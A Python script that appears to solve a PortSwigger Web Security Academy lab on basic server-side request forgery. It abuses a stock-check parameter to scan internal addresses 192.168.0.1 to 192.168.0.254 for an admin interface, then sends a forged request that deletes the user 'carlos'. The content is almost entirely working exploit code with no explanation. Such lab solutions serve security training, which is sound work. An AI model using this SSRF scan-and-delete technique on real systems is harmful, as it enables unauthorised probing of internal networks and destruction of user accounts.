"""
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

stock_url = f'https://{site}/product/stock'
stock_api_data = {}

for i in range(1,255):
    ssrf_data = {
        'stockApi' : f'http://192.168.0.{i}:8080/admin'
    }
    resp = requests.post(stock_url, data=ssrf_data)
    if resp.status_code == 200:
        print(f'Admin interface at 192.168.0.{i}')
        stock_api_data = {'stockApi' : f'http://192.168.0.{i}:8080/admin/delete?username=carlos'}
        break

resp = requests.post(stock_url, data=stock_api_data)